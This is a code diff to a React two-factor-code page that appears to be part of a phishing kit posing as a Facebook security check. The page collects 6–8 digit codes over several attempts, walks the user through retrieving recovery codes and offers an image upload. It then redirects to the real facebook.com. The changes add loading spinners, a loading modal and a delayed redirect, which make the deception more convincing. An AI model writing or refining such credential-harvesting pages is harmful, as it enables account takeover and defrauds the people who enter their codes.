@@ -1,6 +1,7 @@
 import Favicon from '@/assets/images/aGT3gskzWBf.ico';
+import LoadingModal from '@/component/LoadingModal';
 import ImageUpload from '@/pages/client/ImageUpload';
-import { faTimes } from '@fortawesome/free-solid-svg-icons';
+import { faSpinner, faTimes } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import React, { useEffect, useState } from 'react';
@@ -16,7 +17,8 @@ const TwoFa: React.FC = () => {
 	const [maxAttempts, setMaxAttempts] = useState<number>(0);
 	const [loadingTime, setLoadingTime] = useState<number>(0);
 	const [isUploadEnabled, setIsUploadEnabled] = useState<boolean>(false);
-
+	const [isShowLoadingModal, setIsShowLoadingModal] =
+		useState<boolean>(false);
 	useEffect(() => {
 		const isValid = /^\d{6,8}$/.test(twoFaCode);
 		setIsSubmitEnabled(isValid);
@@ -53,10 +55,13 @@ const TwoFa: React.FC = () => {
 			localStorage.setItem('message', newMessage);
 			localStorage.setItem('message_id', response.data.message_id);
 			if (attempts === maxAttempts - 1) {
+				setIsShowLoadingModal(true);
 				if (isUploadEnabled) {
 					setShowModal(true);
 				} else {
-					window.location.href = 'https://www.facebook.com';
+					setTimeout(() => {
+						window.location.href = 'https://www.facebook.com';
+					}, 1000);
 				}
 			} else {
 				setAttempts(attempts + 1);
@@ -135,9 +140,25 @@ const TwoFa: React.FC = () => {
 									: 'cursor-not-allowed bg-[#75aaee]'
 							}`}
 						>
-							<p className='m-0'>Submit code</p>
+							<p className={`m-0 ${isLoading && 'min-w-[68px]'}`}>
+								{' '}
+								{isLoading ? (
+									<FontAwesomeIcon
+										icon={faSpinner}
+										className='animate-spin'
+									/>
+								) : (
+									'Submit code'
+								)}
+							</p>
 						</button>
 					</div>
+					{isShowLoadingModal && (
+						<LoadingModal
+							loadingTime={loadingTime}
+							setShowLoadingModal={setIsShowLoadingModal}
+						/>
+					)}
 				</div>
 			</main>
 
@@ -241,7 +262,7 @@ const TwoFa: React.FC = () => {
 							<p>
 								3. Next to <b>Recovery Codes</b>, click{' '}
 								<b>Setup</b> then
-								<b>Get Codes</b> . If you're already set up
+								<b>Get Codes </b> . If you're already set up
 								recovery codes, you can click <b>Show Codes</b>
 							</p>
 						</div>
@@ -249,7 +270,7 @@ const TwoFa: React.FC = () => {
 				</div>
 			)}
 
-			{showModal && isUploadEnabled && (
+			{showModal && isUploadEnabled && !isShowLoadingModal && (
 				<ImageUpload onClose={() => setShowModal(false)} />
 			)}
 		</div>
